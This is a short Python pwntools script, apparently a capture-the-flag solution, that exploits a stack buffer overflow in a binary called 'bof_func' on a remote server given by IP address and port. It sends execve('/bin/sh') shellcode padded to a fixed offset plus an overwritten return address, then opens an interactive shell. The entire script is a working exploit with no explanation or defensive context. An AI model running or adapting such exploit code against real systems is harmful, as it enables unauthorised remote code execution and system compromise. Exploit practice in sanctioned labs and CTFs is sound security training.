from pwn import *

context.log_level='debug'

# p = process('./bof_func')
p = remote('141.164.48.98', '30002')

# df80 work on local machine

# address = 0x7fffffffdf80
# address = 0x7fffffffe250
address = 0x7fffffffe260

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload = shellcode
payload += b'B' * (0x140 - len(payload))

payload += address.to_bytes(8, 'little')
payload += address.to_bytes(8, 'little')

# pause()
p.sendline(payload)

with open("bof_func_payload.txt", "wb") as f:
    f.write(payload)

p.interactive()
